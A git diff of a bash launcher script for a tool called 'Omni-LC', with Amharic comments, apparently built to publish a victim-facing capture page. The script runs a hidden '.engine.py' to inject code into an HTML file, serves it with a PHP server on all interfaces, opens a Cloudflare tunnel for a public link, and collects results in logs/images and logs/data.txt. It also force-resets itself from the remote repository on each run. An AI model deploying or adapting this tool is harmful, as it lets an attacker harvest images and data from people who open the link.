@@ -8,7 +8,7 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 WHITE='\033[1;37m'
-NC='\033[0m' # No Color
+NC='\033[0m' 
 BOLD='\033[1m'
 
 # --- የማጽጃ ፈንክሽን ---
@@ -19,28 +19,30 @@ cleanup() {
 }
 trap cleanup SIGINT
 
-# --- 1. የ ASCII አርት እና Header (Responsive) ---
-clear
-cols=$(tput cols) # የስክሪኑን ስፋት ማወቅ
-
+# --- 1. የ ASCII አርት እና Header (Fixed & Centered) ---
 draw_header() {
-    local art=(
-        "  /$$$$$$                          /$$         /$$        /$$$$$$ "
-        " /$$__  $$                        |__/        | $$       /$$__  $$"
-        "| $$  \ $$ /$$$$$$/$$$$  /$$$$$$$  /$$         | $$      | $$  \__/"
-        "| $$  | $$| $$_  $$_  $$| $$__  $$| $$ /$$$$$$| $$      | $$      "
-        "| $$  | $$| $$ \ $$ \ $$| $$  \ $$| $$|______/| $$      | $$      "
-        "| $$  | $$| $$ | $$ | $$| $$  | $$| $$         | $$      | $$    $$"
-        "|  $$$$$$/| $$ | $$ | $$| $$  | $$| $$         | $$$$$$$$|  $$$$$$/"
-        " \______/ |__/ |__/ |__/|__/  |__/|__/         |________/ \______/ "
-    )
+    clear
+    local cols=$(tput cols)
+    
+    # ASCII አርቱን በ "Here Document" በመጠቀም ከስህተት መጠበቅ
+    local art_text=$(cat << 'EOF'
+  /$$$$$$                          /$$         /$$        /$$$$$$ 
+ /$$__  $$                        |__/        | $$       /$$__  $$
+| $$  \ $$ /$$$$$$/$$$$  /$$$$$$$  /$$         | $$      | $$  \__/
+| $$  | $$| $$_  $$_  $$| $$__  $$| $$ /$$$$$$| $$      | $$      
+| $$  | $$| $$ \ $$ \ $$| $$  \ $$| $$|______/| $$      | $$      
+| $$  | $$| $$ | $$ | $$| $$  | $$| $$         | $$      | $$    $$
+|  $$$$$$/| $$ | $$ | $$| $$  | $$| $$         | $$$$$$$$|  $$$$$$/
+ \______/ |__/ |__/ |__/|__/  |__/|__/         |________/ \______/ 
+EOF
+)
 
     echo -e "${CYAN}${BOLD}"
-    for line in "${art[@]}"; do
+    # መስመር በመስመር መሃል ላይ ማድረግ
+    while IFS= read -r line; do
         printf "%*s\n" $(( (${#line} + cols) / 2 )) "$line"
-    done
+    done <<< "$art_text"
     
-    # ሰብ-ታይትል (Sub-title)
     local sub1="Developed by Andualem Koriya [ANK - አንኬ]"
     local sub2="Omni-LC Version: 4.0.1 (STABLE)"
     
@@ -53,24 +55,22 @@ draw_header() {
     echo -e "${NC}"
 }
 
-draw_header
-
-# --- 2. የኔትወርክ እና አፕዴት ቼከር (Update Engine) ---
+# --- 2. የኔትወርክ እና አፕዴት ቼከር (Auto-Resume) ---
 check_update() {
     echo -e "${BLUE}[*] የኔትወርክ ግንኙነት በመፈተሽ ላይ... 🌐${NC}"
-    # በ 8.8.8.8 (Google DNS) ግንኙነት መኖሩን ማረጋገጥ
     if ping -c 1 8.8.8.8 &> /dev/null; then
-        echo -e "${GREEN}[+] ኢንተርኔት ተገኝቷል። አዲስ ማሻሻያ (Update) ካለ በማረጋገጥ ላይ... 🔄${NC}"
+        echo -e "${GREEN}[+] ኢንተርኔት ተገኝቷል። አዲስ ማሻሻያ (Update) በማረጋገጥ ላይ... 🔄${NC}"
         
         git fetch &> /dev/null
         LOCAL=$(git rev-parse @)
         REMOTE=$(git rev-parse @{u})
 
-        if [ $LOCAL != $REMOTE ]; then
+        if [ "$LOCAL" != "$REMOTE" ]; then
             echo -e "${WHITE}${BOLD}[!] አዲስ ማሻሻያ ተገኝቷል! ሲስተሙን እያደስኩ ነው...${NC}"
             git reset --hard origin/main &> /dev/null
-            echo -e "${GREEN}[✔] ሲስተሙ ታድሷል። እባክዎ እንደገና ያስጀምሩ!${NC}"
-            exit 0
+            echo -e "${GREEN}[✔] ሲስተሙ ታድሷል። ስራውን እየቀጠልኩ ነው...${NC}"
+            # ፋይሉ ስለታደሰ አዲሱን run.sh መልሶ ያስጀምረዋል
+            exec bash "$0" "$@"
         else
             echo -e "${GREEN}[✔] ሲስተሙ የቅርብ ጊዜ ማሻሻያ ላይ ነው (Up-to-date)።${NC}"
         fi
@@ -79,17 +79,19 @@ check_update() {
     fi
 }
 
+# ዋናውን ስራ ማስጀመር
+draw_header
 check_update
+
 echo -e "${BLUE}--------------------------------------------${NC}"
 
-# --- 3. አስፈላጊ ነገሮችን ማዘጋጀት (ያንተ ኦሪጅናል ኮድ) ---
+# --- 3. ኦሪጅናል ስራዎች (ቀጣይነት ያለው) ---
 echo -e "${YELLOW}[*] ሲስተሙን በማዘጋጀት ላይ... 🛠️${NC}"
 mkdir -p logs/images core
 touch logs/data.txt
 chmod -R 777 logs core
 killall php > /dev/null 2>&1
 
-# 4. ኢንፑት መቀበል
 echo -e -n "${GREEN}[?]${NC} የ HTML ፋይል ስም (default: index.html): "
 read filename
 filename=${filename:-index.html}
@@ -103,17 +105,14 @@ echo -e -n "${GREEN}[?]${NC} የ Port ቁጥር (default: 8080): "
 read port
 port=${port:-8080}
 
-# 5. የፓይዘን ኢንጄክተርን ማስኬድ
 echo -e "${YELLOW}[*] ኢንጄክሽን እየተከናወነ ነው... 💉${NC}"
 python3 .engine.py "$filename"
 echo -e "${GREEN}[+] ኢንጄክሽን ተጠናቋል።${NC}"
 
-# 6. PHP ሰርቨር ማስጀመር
 echo -e "${YELLOW}[*] የ PHP ሰርቨርን በ Port $port እያስነሳሁ ነው... 🚀${NC}"
 php -S 0.0.0.0:$port > /dev/null 2>&1 &
 sleep 2
 
-# 7. Cloudflare Tunnel
 echo -e "${BLUE}--------------------------------------------${NC}"
 echo -e "${PURPLE}${BOLD}[!] የ CLOUDFLARE ሊንክ እየተፈጠረ ነው... ☁️${NC}"
 echo -e "${BLUE}--------------------------------------------${NC}"
@@ -137,7 +136,6 @@ echo -e "\n"
 
 if [ -z "$CF_URL" ]; then
     echo -e "${RED}[-] ስህተት፦ ሊንኩን ማመንጨት አልተቻለም።${NC}"
-    echo -e "${RED}[-] ምናልባት የኢንተርኔት ግንኙነት የለም ወይም cloudflared ተዘግቷል።${NC}"
 else
     echo -e "${GREEN}${BOLD}--------------------------------------------"
     echo -e "  ✅ ስራው ተጠናቋል! "
